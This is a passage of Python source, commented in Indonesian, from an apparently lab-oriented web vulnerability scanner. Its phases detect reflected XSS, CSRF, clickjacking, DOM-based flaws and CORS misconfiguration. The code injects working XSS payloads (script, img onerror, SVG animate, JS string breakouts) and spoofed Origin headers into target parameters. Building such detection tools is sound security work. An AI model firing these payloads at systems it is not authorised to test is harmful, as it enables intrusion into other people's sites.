        self.phase_clickjacking(self.pages)
        # DOM-based vulnerabilities (konservatif, analisis statis JS/HTML; tanpa eksekusi browser)
        self.phase_dom_based(self.pages)
        # CORS & XXE (konservatif, berbasis bukti respons/probe terkontrol; anti false positive)
        self.phase_cors(self.pages)
        self.phase_xxe(self.pages, self.points)
        return self.report()

    # ======================== XSS SCANNING PHASES (30 LABS) ========================
    # Catatan: deteksi XSS dilakukan konservatif berbasis bukti HTTP/HTML yang dapat diverifikasi.
    # Lab yang memerlukan eksekusi browser/DOM runtime, interaksi multi-langkah (stored),
    # atau skenario eksploitasi kompleks tidak dikonfirmasi tanpa bukti kuat agar tidak false positive.

    def _xss_points(self, points: list[Point], limit: int = 12) -> list[Point]:
        cands = [p for p in points if p.kind in {"query", "form", "cookie"}]
        if not cands and points:
            cands = list(points)
        # prioritaskan parameter yang umum untuk XSS
        def score(p: Point) -> int:
            n = (p.name or "").lower()
            s = p.interest
            for tok in ("search", "q", "query", "term", "message", "comment", "name", "input", "return", "url", "redirect", "path"):
                if tok == n or tok in n:
                    s += 6
            return s
        cands.sort(key=score, reverse=True)
        return cands[:limit]

    def _xss_payload_reflected(self, resp: Response | None, payload: str) -> bool:
        if not resp or resp.error or resp.status is None or not resp.text:
            return False
        body = resp.text
        # harus terefleks persis (atau setara raw) tanpa dihapus
        return payload in body

    def _xss_reflected_in_context(self, resp: Response | None, payload: str, context: str) -> bool:
        if not self._xss_payload_reflected(resp, payload):
            return False
        body = resp.text or ""
        low = body.lower()
        p_low = payload.lower()
        idx = low.find(p_low)
        if idx < 0:
            return False
        window = body[max(0, idx - 120): idx + len(payload) + 120]
        wlow = window.lower()
        if context == "html_raw":
            # terefleks sebagai tag/markup aktif, bukan entity-encoded
            return ("<" + p_low.lstrip("<")[:10] in wlow) or ("<script" in wlow) or ("onerror=" in wlow) or ("onload=" in wlow) or ("<img" in wlow) or ("<svg" in wlow)
        if context == "attribute_breakout":
            # ada breakout atribut (quote + handler/tag) dalam window sekitar refleksi
            return ('"' in payload or "'" in payload) and (" on" in wlow or "onfocus" in wlow or "onmouseover" in wlow or "href=" in wlow or "javascript:" in wlow)
        if context == "js_string_breakout":
            # payload keluar dari string JS (quote diikuti kode/penutup script)
            return ("</script" in wlow) or ("';" in window) or ('";' in window) or ("'-" in window) or ("alert(" in wlow)
        if context == "template_literal":
            return "${" in payload and "${" in window
        if context == "canonical_href":
            # refleksi di atribut href canonical/link
            return ("<link" in wlow and "canonical" in wlow) or ("href=" in wlow and payload.split("?")[-1][:12].lower() in wlow)
        return False

    def _confirm_xss(self, lab: int, point: Point, resp: Response, payload: str, context: str, method: str) -> bool:
        if lab in self._confirmed:
            return True
        ev = (
            f"Payload terefleks terverifikasi pada konteks {context} di {point.label} "
            f"(HTTP {resp.status}). Payload: {payload}. Cuplikan respons: {snippet(resp.text, 260)}"
        )
        self._mark(lab, point, ev, method)
        return True

    def phase_xss_reflected_html(self, points: list[Point]) -> None:
        # 36: nothing encoded (raw script/img/svg reflected)
        # 48: some tags blocked (img/svg allowed while script may be filtered)
        # 19: most tags and attributes blocked (custom tag like <xss> reflected with handler)
        # 20: all tags blocked except custom ones (custom tag reflected)
        candidates = self._xss_points(points)
        for point in candidates:
            if not self._within_budget():
                return
            # Lab 36
            if 36 not in self._confirmed:
                for payload in ('<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>'):
                    resp = self.send(point, payload)
                    if self._xss_payload_reflected(resp, payload):
                        self._confirm_xss(36, point, resp, payload, "html_raw", "reflected_html_nothing_encoded")
                        break
            # Lab 48 (script mungkin diblok, img/svg lolos)
            if 48 not in self._confirmed:
                for payload in ('<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<body onresize=alert(1)>'):
                    resp = self.send(point, payload)
                    if self._xss_payload_reflected(resp, payload) and not self._xss_payload_reflected(self.send(point, '<script>alert(1)</script>'), '<script>alert(1)</script>') if self._within_budget() else False:
                        self._confirm_xss(48, point, resp, payload, "html_raw", "reflected_some_tags_blocked")
                        break
                    elif self._xss_payload_reflected(resp, payload):
                        # jika img/svg reflected, bukti tag tertentu terefleks (tetap konservatif: hanya jika jelas)
                        body = (resp.text or "").lower()
                        if '<script>alert(1)</script>' not in body and (('<img' in body and 'onerror' in body) or ('<svg' in body and 'onload' in body)):
                            self._confirm_xss(48, point, resp, payload, "html_raw", "reflected_some_tags_blocked")
                            break
            # Lab 19/20 custom tags (terefleks sebagai custom element dengan handler)
            for lab, payloads, method in [
                (19, ('<xss autofocus tabindex=1 onfocus=alert(1)>', '<xss onfocus=alert(1) autofocus>'), "reflected_custom_tag_blocked"),
                (20, ('<xss onfocus=alert(1) autofocus tabindex=1>', '<mytag onfocus=alert(1) autofocus>'), "reflected_custom_tag_only"),
            ]:
                if lab in self._confirmed or not self._within_budget():
                    continue
                for payload in payloads:
                    resp = self.send(point, payload)
                    if self._xss_payload_reflected(resp, payload) and ('onfocus' in (resp.text or '').lower()):
                        self._confirm_xss(lab, point, resp, payload, "html_raw", method)
                        break

    def phase_xss_stored_html(self, points: list[Point]) -> None:
        # Stored XSS memerlukan verifikasi penyimpanan+eksekusi lintas permintaan/halaman.
        # Tanpa alur submit+retrieve yang tervalidasi, tidak dikonfirmasi untuk mencegah false positive.
        return

    def phase_xss_dom(self, points: list[Point]) -> None:
        # DOM XSS bergantung eksekusi sisi klien (sink/source di browser). Analisis HTTP statis
        # tidak cukup untuk membuktikan eksekusi tanpa false positive, sehingga tidak dikonfirmasi di sini.
        return

    def phase_xss_attribute(self, points: list[Point]) -> None:
        candidates = self._xss_points(points)
        for point in candidates:
            if not self._within_budget():
                return
            # Lab 42: angle brackets HTML-encoded but attribute breakout possible (quote not encoded)
            if 42 not in self._confirmed:
                token = random_token("xa")
                for payload in (f'" onmouseover="alert(1)" x="{token}', f"\" autofocus onfocus=alert(1) x=\"{token}"):
                    resp = self.send(point, payload)
                    body = resp.text or ""
                    if token in body and ("onmouseover" in body or "onfocus" in body) and payload in body:
                        self._confirm_xss(42, point, resp, payload, "attribute_breakout", "reflected_attribute_breakout")
                        break
                    # kadang sebagian di-encode tapi handler tetap muncul dalam atribut
                    if token in body and (" onmouseover=\"alert(1)\"" in body or " onfocus=alert(1)" in body):
                        self._confirm_xss(42, point, resp, payload, "attribute_breakout", "reflected_attribute_breakout")
                        break
            # Lab 21: event handlers and href blocked - coba SVG/animatable atau payload alternatif yang terefleks utuh
            if 21 not in self._confirmed:
                for payload in ('<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>',
                                '<svg><animate attributeName=onbegin values=alert(1) /><text>t</text></svg>'):
                    resp = self.send(point, payload)
                    if self._xss_payload_reflected(resp, payload):
                        self._confirm_xss(21, point, resp, payload, "html_raw", "reflected_svg_animate")
                        break
            # Lab 23: reflected XSS in canonical link tag (accesskey/onclick in link reflected)
            if 23 not in self._confirmed:
                for payload in ("?'accesskey='x'onclick='alert(1)", "?%27accesskey=%27x%27onclick=%27alert(1)"):
                    resp = self.send(point, payload)
                    body = resp.text or ""
                    if "accesskey" in body and "onclick" in body and "alert(1)" in body and "canonical" in body.lower():
                        self._confirm_xss(23, point, resp, payload, "canonical_href", "reflected_canonical_link")
                        break

    def phase_xss_javascript(self, points: list[Point]) -> None:
        candidates = self._xss_points(points)
        for point in candidates:
            if not self._within_budget():
                return
            # Lab 24: single quote and backslash escaped -> break out with </script> or similar
            if 24 not in self._confirmed:
                for payload in ("</script><script>alert(1)</script>", "</script><img src=x onerror=alert(1)>"):
                    resp = self.send(point, payload)
                    if self._xss_payload_reflected(resp, payload):
                        self._confirm_xss(24, point, resp, payload, "js_string_breakout", "reflected_js_script_breakout")
                        break
            # Lab 25: angle brackets and double quotes HTML-encoded and single quotes escaped
            # sering bypass dengan backslash untuk menetralkan escape: \';alert(1)//
            if 25 not in self._confirmed:
                for payload in ("\\';alert(1)//", "\\'-alert(1)-'", "\\';alert(1);//"):
                    resp = self.send(point, payload)
                    body = resp.text or ""
                    if payload in body and "alert(1)" in body:
                        self._confirm_xss(25, point, resp, payload, "js_string_breakout", "reflected_js_escape_breakout")
                        break
            # Lab 44: angle brackets HTML encoded in JS string -> break out of string with quote
            if 44 not in self._confirmed:
                for payload in ("'-alert(1)-'", "';alert(1);//", "'-alert(document.domain)-'"):
                    resp = self.send(point, payload)
                    body = resp.text or ""
                    if payload in body and "alert(" in body:
                        self._confirm_xss(44, point, resp, payload, "js_string_breakout", "reflected_js_quote_breakout")
                        break

    def phase_xss_angularjs(self, points: list[Point]) -> None:
        # AngularJS sandbox escape/DOM expression membutuhkan konteks AngularJS + eksekusi client-side.
        # Tanpa bukti eksekusi terverifikasi, tidak dikonfirmasi untuk menghindari false positive.
        return

    def phase_xss_template_literal(self, points: list[Point]) -> None:
        candidates = self._xss_points(points)
        for point in candidates:
            if not self._within_budget() or 27 in self._confirmed:
                return
            token = random_token("tl")
            for payload in (f"${{alert(1)}}{token}", f"${{7*7}}{token}"):
                resp = self.send(point, payload)
                body = resp.text or ""
                # bukti kuat: ekspresi template literal terefleks mentah di dalam template literal
                if payload in body and "${" in body:
                    self._confirm_xss(27, point, resp, payload, "template_literal", "reflected_template_literal")
                    break

    def phase_xss_csp_bypass(self, points: list[Point]) -> None:
        # CSP bypass/dangling markup bergantung pada kebijakan CSP spesifik dan perilaku browser.
        # Konfirmasi otomatis dari HTTP statis berisiko false positive, sehingga dilewati kecuali bukti kuat lain ada.
        return

    def phase_xss_exploitation(self, points: list[Point]) -> None:
        # Skenario eksploitasi (steal cookies/capture passwords/perform CSRF) bukan kerentanan terpisah
        # yang dapat diverifikasi aman dari pemindaian pasif; memerlukan XSS terkonfirmasi dan alur eksploitasi.
        # Tidak dikonfirmasi otomatis untuk menghindari false positive.
        return

    def phase_xss_advanced(self, points: list[Point]) -> None:
        # Lab 22 (SVG markup allowed) dan 26 (stored onclick) memerlukan bukti kontekstual/eksekusi spesifik.
        # Coba deteksi refleksi SVG mentah untuk 22 secara konservatif.
        candidates = self._xss_points(points)
        for point in candidates:
            if not self._within_budget() or 22 in self._confirmed:
                return
            for payload in ('<svg><animatetransform onbegin=alert(1) attributeName=transform>', '<svg onload=alert(1)>', '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'):
                resp = self.send(point, payload)
                if self._xss_payload_reflected(resp, payload) and '<svg' in (resp.text or '').lower():
                    self._confirm_xss(22, point, resp, payload, "html_raw", "reflected_svg_markup")
                    break
        # 26 adalah stored XSS pada onclick: butuh alur simpan/tampil yang tidak bisa diverifikasi aman di sini.
        return


    # ======================== CSRF & CLICKJACKING (konservatif, anti false positive) ========================

    @staticmethod
    def _headers_lower(headers: dict[str, str] | None) -> dict[str, str]:
        out: dict[str, str] = {}
        for k, v in (headers or {}).items():
            try:
                out[str(k).lower()] = str(v)
            except Exception:
                continue
        return out

    @staticmethod
    def _has_csrf_token_field(form: FormSpec) -> tuple[bool, list[str]]:
        names: list[str] = []
        found = False
        for name, _val, _typ in form.fields:
            nl = (name or "").lower()
            if any(tok in nl for tok in ("csrf", "xsrf", "authenticity", "__requestverificationtoken", "anti_csrf", "anticsrf", "_csrf", "token")):
                # "token" alone can be ambiguous, but common for CSRF; keep as indicator
                names.append(name)
                if "csrf" in nl or "xsrf" in nl or "authenticity" in nl or "requestverification" in nl or nl in ("_token", "token", "csrftoken"):
                    found = True
        # require stronger signal: explicit csrf/xsrf/authenticity or exact token-ish names
        if not found:
            for name in names:
                nl = name.lower()
                if nl.endswith("token") or nl.startswith("token") or "csrf" in nl or "xsrf" in nl:
                    found = True
                    break
        return found, names

    @staticmethod
    def _is_state_changing_form(form: FormSpec) -> bool:
        method = (form.method or "get").upper()
        action = (form.action or "").lower()
        if method == "POST":
            return True
        if any(k in action for k in ("change", "update", "edit", "delete", "transfer", "email", "password", "account", "profile", "checkout", "submit", "comment", "post")):
            return True
        # forms with password or sensitive fields
        if form.has_password:
            return True
        return False

    @staticmethod
    def _frameable(headers: dict[str, str] | None) -> tuple[bool, str]:
        h = {str(k).lower(): str(v) for k, v in (headers or {}).items()}
        xfo = h.get("x-frame-options", "").lower()
        csp = h.get("content-security-policy", "")
        # XFO
        if "deny" in xfo:
            return False, "X-Frame-Options: DENY"
        if "sameorigin" in xfo:
            return False, "X-Frame-Options: SAMEORIGIN"
        # CSP frame-ancestors
        m = re.search(r"frame-ancestors\s+([^;]+)", csp, re.I)
        if m:
            fa = m.group(1).strip().lower()
            if "'none'" in fa:
                return False, "CSP frame-ancestors 'none'"
            if "'self'" in fa and "http" not in fa and "*" not in fa:
                return False, "CSP frame-ancestors 'self'"
            # explicit restrictive list without wildcard
            if "*" not in fa and fa:
                return False, f"CSP frame-ancestors restrictive ({m.group(1).strip()[:60]})"
        # no blocking directives found
        reasons = []
        if xfo:
            reasons.append(f"X-Frame-Options={h.get('x-frame-options','')}")
        if m:
            reasons.append(f"frame-ancestors={m.group(1).strip()}")
        if not reasons:
            reasons.append("tidak ada X-Frame-Options/CSP frame-ancestors")
        return True, "; ".join(reasons)

    @staticmethod
    def _has_frame_buster(text: str, js_text: str = "") -> tuple[bool, str]:
        blob = (text or "") + "\n" + (js_text or "")
        patterns = [
            (r"top\.location\s*!?=\s*(self|window)\.location", "top.location != self.location"),
            (r"self\s*!==?\s*top", "self != top"),
            (r"top\s*!==?\s*self", "top != self"),
            (r"window\.top\s*!==?\s*window\.self", "window.top != window.self"),
            (r"if\s*\(\s*top\s*!=", "if (top !="),
            (r"frameElement", "frameElement check"),
            (r"parent\.frames\.length", "parent.frames.length"),
        ]
        for pat, label in patterns:
            if re.search(pat, blob, re.I):
                return True, label
        return False, ""

    def _pick_csrf_page(self, pages: list[Page]) -> tuple[Page | None, FormSpec | None]:
        # prefer page with state-changing form
        best = (None, None, -1)
        for page in pages:
            for form in page.forms:
                score = 0
                if self._is_state_changing_form(form):
                    score += 5
                if form.has_password:
                    score += 2
                if (form.method or "").lower() == "post":
                    score += 2
                if form.fields:
                    score += 1
                if score > best[2]:
                    best = (page, form, score)
        return best[0], best[1]

    def phase_csrf_defenses(self, pages: list[Page]) -> None:
        """Deteksi konservatif berbasis analisis form/header/cookie pada respons.
        Lab yang memerlukan verifikasi perilaku lintas sesi/metode/eksploitasi browser
        tidak dikonfirmasi tanpa bukti kuat untuk menghindari false positive."""
        page, form = self._pick_csrf_page(pages)
        if not page or not form:
            return
        point = Point(key="csrf", kind="form", label=f"form action={form.action}", url=form.action or page.url,
                      name=(form.fields[0][0] if form.fields else "form"), original="", page_url=page.url,
                      method=(form.method or "POST").upper(), fields=form.fields, interest=5)
        has_token, token_names = self._has_csrf_token_field(form)
        state_changing = self._is_state_changing_form(form)
        headers = self._headers_lower(page.headers)

        # 49: no defenses - state-changing form, no CSRF token field detected
        if 49 not in self._confirmed and state_changing and not has_token:
            ev = (f"Form state-changing terdeteksi di {page.url} (action={form.action}, method={form.method}) "
                  f"tanpa field token anti-CSRF yang dapat diidentifikasi. Field: {[n for n,_,_ in form.fields]}. "
                  f"Bukti berbasis inspeksi respons/form.")
            self._mark(49, point, ev, "csrf_no_token_in_form")

        # 54: token duplicated in cookie - CSRF token field exists and a cookie with matching name/value context
        if 54 not in self._confirmed and has_token and token_names:
            cookies = getattr(page, 'cookie_names', {}) or {}
            cookies_l = {str(k).lower(): str(v) for k, v in cookies.items()}
            for tname in token_names:
                tval = None
                for n, v, _ in form.fields:
                    if n == tname:
                        tval = v
                        break
                if tval is None:
                    continue
                # look for cookie with same name or obvious csrf cookie with same value
                for ck, cv in cookies_l.items():
                    if (ck == tname.lower() or 'csrf' in ck or 'xsrf' in ck) and cv and cv == tval:
                        ev = (f"Indikasi double-submit cookie: field form '{tname}' memiliki nilai sama dengan cookie '{ck}' "
                              f"pada {page.url}. Nilai teramati: {tval}. Bukti berbasis inspeksi form+cookie respons.")
                        self._mark(54, point, ev, "csrf_double_submit_cookie_observed")
                        break
                if 54 in self._confirmed:
                    break

        # 53: token tied to non-session cookie (indikasi: token terkait cookie csrf terpisah) - hanya jika bukti eksplisit ganda cookie+param
        # konservatif: tanpa dua sesi/eksperimen tidak bisa dipastikan "not tied to user session" vs "tied to non-session cookie"
        # sehingga 50,51,52,53,55,56,57 tidak dikonfirmasi otomatis dari analisis pasif untuk menghindari FP.

    def phase_csrf_referer(self, pages: list[Page]) -> None:
        """Validasi Referer (hadir/tidak, longgar/ketat) umumnya memerlukan uji permintaan terkontrol
        terhadap aksi state-changing. Tanpa bukti respons diferensial yang aman dan tidak merusak,
        lab 58/59 tidak dikonfirmasi otomatis untuk menghindari false positive."""
        # Tidak melakukan pengujian aktif yang berpotensi memicu aksi state-changing.
        return

    def phase_clickjacking(self, pages: list[Page]) -> None:
        """Deteksi clickjacking konservatif berbasis header framing, form, dan indikator UI/script."""
        # pilih halaman kandidat: punya form/sensitif, atau target utama
        candidates = list(pages)
        if not candidates:
            return
        for page in candidates:
            if not self._within_budget():
                return
            frameable, frame_reason = self._frameable(page.headers)
            has_form = bool(page.forms)
            any_csrf = any(self._has_csrf_token_field(f)[0] for f in page.forms)
            any_prefill = False
            prefill_evidence = ""
            for form in page.forms:
                # cek apakah query param URL terpantul ke value input (prefill dari parameter URL)
                try:
                    q = dict(parse_qsl(urlparse(page.url).query, keep_blank_values=True))
                except Exception:
                    q = {}
                ql = {str(k).lower(): str(v) for k, v in q.items()}
                for name, val, _typ in form.fields:
                    if not val:
                        continue
                    nl = name.lower()
                    # nilai field sama dengan parameter URL bernama sama/terkait -> prefill
                    if nl in ql and ql[nl] and ql[nl] == val:
                        any_prefill = True
                        prefill_evidence = f"field '{name}' terisi dari parameter URL ({nl}={val}) pada {page.url}"
                        break
                if any_prefill:
                    break
            has_buster, buster_ev = self._has_frame_buster(page.text, page.js_text)

            point = Point(key="clickjacking", kind="page", label=f"page {page.url}", url=page.url,
                          name="page", original="", page_url=page.url, method="GET", interest=4)

            # 60: Basic clickjacking with CSRF token protection - frameable page that has CSRF-protected form
            if 60 not in self._confirmed and frameable and has_form and any_csrf:
                ev = (f"Halaman frameable ({frame_reason}) dengan form ber-token CSRF di {page.url}. "
                      f"Ini menunjukkan perlindungan CSRF ada namun pembingkaian tidak dicegah. "
                      f"Bukti: header framing tidak membatasi, form fields={[ [n for n,_,_ in f.fields] for f in page.forms ]}.")
                self._mark(60, point, ev, "clickjacking_frameable_with_csrf_form")

            # 61: prefilled from URL parameter - frameable (atau setidaknya dapat dibingkai target) + input prefill dari URL
            if 61 not in self._confirmed and frameable and any_prefill:
                ev = (f"Halaman frameable ({frame_reason}) dengan input form terisi dari parameter URL: {prefill_evidence}. "
                      f"Bukti berbasis refleksi parameter ke nilai input form.")
                self._mark(61, point, ev, "clickjacking_url_prefill")

            # 62: frame buster script - bukti: frame buster script ada, namun header framing tidak mencegah pembingkaian
            # (indikasi pertahanan berbasis script, skenario "clickjacking with a frame buster script").
            if 62 not in self._confirmed and has_buster and frameable:
                ev = (f"Frame buster script terdeteksi pada {page.url} (indikator: {buster_ev}), sementara halaman tetap frameable ({frame_reason}). "
                      f"Bukti berbasis analisis script/header respons.")
                self._mark(62, point, ev, "clickjacking_frame_buster_detected")

            # 63/64: exploitation chains (trigger DOM XSS via clickjacking, multistep) memerlukan interaksi UI/browser bertahap
            # dan tidak dapat diverifikasi andal dari analisis HTTP statis -> tidak dikonfirmasi otomatis (anti-FP).



    # ======================== DOM-BASED VULNERABILITIES (konservatif, analisis statis) ========================

    @staticmethod
    def _script_blocks(page: Page) -> list[str]:
        blocks: list[str] = []
        src = page.text or ""
        for m in re.finditer(r"<script\b[^>]*>(.*?)</script>", src, re.I | re.S):
            blocks.append(m.group(1) or "")
        if page.js_text:
            blocks.append(page.js_text)
        return [b for b in blocks if b and b.strip()]

    @staticmethod
    def _has_message_listener(js: str) -> bool:
        return bool(re.search(r"addEventListener\s*\(\s*['\"]message['\"]", js, re.I) or
                    re.search(r"\bonmessage\s*=", js, re.I) or
                    re.search(r"window\s*\.\s*onmessage\b", js, re.I))

    @staticmethod
    def _msg_data_used(js: str) -> bool:
        # event.data / e.data / msg.data / message.data referenced
        return bool(re.search(r"\b(?:event|e|msg|message|evt)\s*\.\s*data\b", js))

    @staticmethod
    def _dangerous_html_sink(js: str) -> bool:
        return bool(re.search(r"\.\s*(?:innerHTML|outerHTML)\s*[+=]", js) or
                    re.search(r"\.\s*insertAdjacentHTML\s*\(", js) or
                    re.search(r"\bdocument\s*\.\s*(?:write|writeln)\s*\(", js) or
                    re.search(r"\$\s*\([^\)]*\)\s*\.\s*(?:html|append|prepend)\s*\(", js))

    @staticmethod
    def _dangerous_js_sink(js: str) -> bool:
        return bool(re.search(r"\beval\s*\(", js) or
                    re.search(r"\b(?:setTimeout|setInterval)\s*\(\s*[^\),'\"]+\s*,", js) or
                    re.search(r"\bnew\s+Function\s*\(", js))

    @staticmethod
    def _location_sink(js: str) -> bool:
        return bool(re.search(r"\b(?:location|window\.location|document\.location)\s*(?:\.href|\.pathname|\.search|\.hash)?\s*=(?!=)", js) or
                    re.search(r"\blocation\s*\.\s*(?:replace|assign)\s*\(", js) or
                    re.search(r"\bwindow\.open\s*\(", js) or
                    re.search(r"\.\s*(?:href|src)\s*=(?!=)", js))

    @staticmethod
    def _controllable_source(js: str) -> bool:
        return bool(re.search(r"location\.(?:hash|search|href)\b", js) or
                    re.search(r"document\.(?:URL|documentURI|baseURI|referrer)\b", js) or
                    re.search(r"window\.name\b", js) or
                    re.search(r"URLSearchParams\s*\(", js) or
                    re.search(r"location\s*\.\s*search\b", js))

    def phase_dom_based(self, pages: list[Page]) -> None:
        """Deteksi konservatif DOM-based vulnerabilities dari analisis statis JS/HTML yang disajikan.
        Tanpa eksekusi browser/runtime, konfirmasi hanya diberikan jika pola source->sink/indikator
        clobbering tampak eksplisit dan kuat pada konten respons untuk menghindari false positive."""
        for page in pages:
            if not self._within_budget():
                return
            blocks = self._script_blocks(page)
            if not blocks and not page.text:
                continue
            blob_js = "\n".join(blocks)
            html = page.text or ""
            point = Point(key="dom", kind="page", label=f"page {page.url}", url=page.url,
                          name="page", original="", page_url=page.url, method="GET", interest=4)

            # 65: DOM XSS using web messages (message listener + data to dangerous sink)
            if 65 not in self._confirmed and self._has_message_listener(blob_js) and self._msg_data_used(blob_js):
                if self._dangerous_html_sink(blob_js) or self._dangerous_js_sink(blob_js):
                    ev = (f"Terdeteksi event listener 'message' yang menggunakan event.data dan terdapat sink berbahaya "
                          f"(innerHTML/document.write/eval/setTimeout-string/dll) pada script di {page.url}. "
                          f"Bukti berbasis analisis statis JS respons.")
                    self._mark(65, point, ev, "dom_xss_web_messages_source_sink")

            # 66: DOM XSS using web messages and a JavaScript URL (message data -> location/href/src sink)
            if 66 not in self._confirmed and self._has_message_listener(blob_js) and self._msg_data_used(blob_js):
                if self._location_sink(blob_js):
                    ev = (f"Terdeteksi event listener 'message' yang menggunakan event.data dan mengalir ke sink navigasi/URL "
                          f"(location/location.href/src/href/window.open) pada script di {page.url}. "
                          f"Bukti berbasis analisis statis JS respons (potensi javascript: URL).")
                    self._mark(66, point, ev, "dom_xss_web_messages_js_url_sink")

            # 67: DOM XSS using web messages and JSON.parse (message + JSON.parse + sink)
            if 67 not in self._confirmed and self._has_message_listener(blob_js) and re.search(r"JSON\.parse\s*\(", blob_js):
                if self._msg_data_used(blob_js) and (self._dangerous_html_sink(blob_js) or self._dangerous_js_sink(blob_js) or self._location_sink(blob_js)):
                    ev = (f"Terdeteksi event listener 'message' dengan JSON.parse atas data pesan dan penggunaan hasil ke sink "
                          f"berbahaya/navigasi pada script di {page.url}. Bukti berbasis analisis statis JS respons.")
                    self._mark(67, point, ev, "dom_xss_web_messages_json_parse_sink")

            # 68: DOM-based open redirection (controllable source -> navigation sink)
            if 68 not in self._confirmed and self._controllable_source(blob_js) and self._location_sink(blob_js):
                # require navigation-specific sink (not just any href/src attribute assignment in isolation)
                if re.search(r"\b(?:location|window\.location|document\.location)\s*(?:\.href)?\s*=(?!=)", blob_js) or \
                   re.search(r"\blocation\s*\.\s*(?:replace|assign)\s*\(", blob_js) or re.search(r"\bwindow\.open\s*\(", blob_js):
                    ev = (f"Terdeteksi sumber terkontrol (location.hash/search/URL/window.name) yang mengalir ke sink navigasi "
                          f"(location/location.href/replace/assign/window.open) pada script di {page.url}. "
                          f"Bukti berbasis analisis statis JS respons.")
                    self._mark(68, point, ev, "dom_open_redirection_source_sink")

            # 69: DOM-based cookie manipulation (controllable source -> document.cookie)
            if 69 not in self._confirmed and self._controllable_source(blob_js) and re.search(r"\bdocument\.cookie\s*=(?!=)", blob_js):
                ev = (f"Terdeteksi sumber terkontrol (location.hash/search/URL/window.name) yang digunakan dalam penulisan "
                      f"document.cookie pada script di {page.url}. Bukti berbasis analisis statis JS respons.")
                self._mark(69, point, ev, "dom_cookie_manipulation_source_sink")

            # 70: Exploiting DOM clobbering to enable XSS
            # Bukti kuat: pola clobbering elemen bernama/id (mis. koleksi anchor dengan id & name sama) dan script
            # yang memakai properti clobberable sebagai sumber nilai (mis. defaultAvatar.avatar) menuju sink/atribut.
            if 70 not in self._confirmed:
                clobber_html = bool(re.search(r"<a\s+[^>]*\bid\s*=\s*['\"]?defaultAvatar['\"]?[^>]*\bname\s*=", html, re.I) or
                                    re.search(r"<a\s+[^>]*\bname\s*=\s*['\"]?avatar['\"]?[^>]*\bid\s*=\s*['\"]?defaultAvatar['\"]?", html, re.I) or
                                    (re.search(r"\bid\s*=\s*['\"]defaultAvatar['\"]", html, re.I) and re.search(r"\bname\s*=\s*['\"]avatar['\"]", html, re.I)))
                clobber_js = bool(re.search(r"window\.defaultAvatar\s*\|\|", blob_js) or re.search(r"defaultAvatar\.avatar\b", blob_js))
                if clobber_html and clobber_js:
                    ev = (f"Terdeteksi pola DOM clobbering (elemen anchor/id-name 'defaultAvatar'/'avatar') pada HTML dan penggunaan "
                          f"properti clobberable (defaultAvatar.avatar/window.defaultAvatar) pada script di {page.url}. "
                          f"Bukti berbasis analisis statis HTML+JS respons.")
                    self._mark(70, point, ev, "dom_clobbering_xss_pattern")

            # 71: Clobbering DOM attributes to bypass HTML filters
            # Bukti kuat: markup clobbering atribut/properti (mis. input/form dengan id/name 'attributes' atau 'getAttribute')
            # yang umum digunakan untuk mem-bypass filter berbasis atribut DOM.
            if 71 not in self._confirmed:
                clobber_attr = bool(re.search(r"\b(?:id|name)\s*=\s*['\"]attributes['\"]", html, re.I) or
                                    re.search(r"\bname\s*=\s*['\"]getAttribute['\"]", html, re.I) or
                                    re.search(r"<form[^>]*\bid\s*=\s*['\"][^'\"]+['\"][^>]*>.*?\bname\s*=\s*['\"]attributes['\"]", html, re.I | re.S))
                if clobber_attr:
                    ev = (f"Terdeteksi markup DOM clobbering pada atribut/properti (id/name 'attributes' atau 'getAttribute') "
                          f"di {page.url}, pola yang dapat mem-bypass filter HTML berbasis atribut DOM. "
                          f"Bukti berbasis analisis statis HTML respons.")
                    self._mark(71, point, ev, "dom_clobbering_attributes_markup")



    # ======================== CORS (konservatif, probe Origin terkontrol) ========================

    def _cors_candidate_urls(self, pages: list[Page]) -> list[str]:
        urls = [self.target_url]
        for page in pages[:12]:
            urls.append(page.url)
            for form in page.forms[:4]:
                if form.action:
                    urls.append(form.action)
        out: list[str] = []
        seen = set()
        for u in urls:
            try:
                cu = canonical_url(u)
            except Exception:
                cu = u
            if not cu or cu in seen or not self._same_origin(cu):
                continue
            seen.add(cu)
            out.append(cu)
        return out[:12]

    @staticmethod
    def _resp_header(headers: dict[str, str] | None, name: str) -> str | None:
        if not headers:
            return None
        nl = name.lower()
        for k, v in headers.items():
            if str(k).lower() == nl:
                return str(v)
        return None

    def phase_cors(self, pages: list[Page]) -> None:
        """Deteksi konservatif CORS misconfiguration dengan probe Origin eksplisit.
        Konfirmasi hanya jika header CORS merespons dengan refleksi origin yang diminta
        sesuai skenario lab (bukti header jelas), untuk menghindari false positive."""
        urls = self._cors_candidate_urls(pages)
        if not urls:
            return
        evil_https = "https://evil-example.test"
        evil_http = "http://evil-example.test"
        for url in urls:
            if not self._within_budget():
                return
            point = Point(key="cors", kind="page", label=f"endpoint {url}", url=url,
                          name="origin", original="", page_url=url, method="GET", interest=3)
            # 72: basic origin reflection (arbitrary https origin reflected)
            if 72 not in self._confirmed:
                resp = self._request("GET", url, headers={"Origin": evil_https}, allow_redirects=False)
                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
                if acao and acao.strip() == evil_https and acao.strip() != "*":
                    ev = (f"Origin probe ({evil_https}) ke {url} direfleksikan pada Access-Control-Allow-Origin={acao!r}"
                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
                          + ". Bukti berbasis header respons CORS.")
                    self._mark(72, point, ev, "cors_basic_origin_reflection")
            # 73: trusted null origin
            if 73 not in self._confirmed and self._within_budget():
                resp = self._request("GET", url, headers={"Origin": "null"}, allow_redirects=False)
                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
                if acao and acao.strip().lower() == "null":
                    ev = (f"Origin probe (null) ke {url} diterima: Access-Control-Allow-Origin={acao!r}"
                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
                          + ". Bukti berbasis header respons CORS.")
                    self._mark(73, point, ev, "cors_trusted_null_origin")
            # 74: trusted insecure protocols (http origin reflected)
            if 74 not in self._confirmed and self._within_budget():
                resp = self._request("GET", url, headers={"Origin": evil_http}, allow_redirects=False)
                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
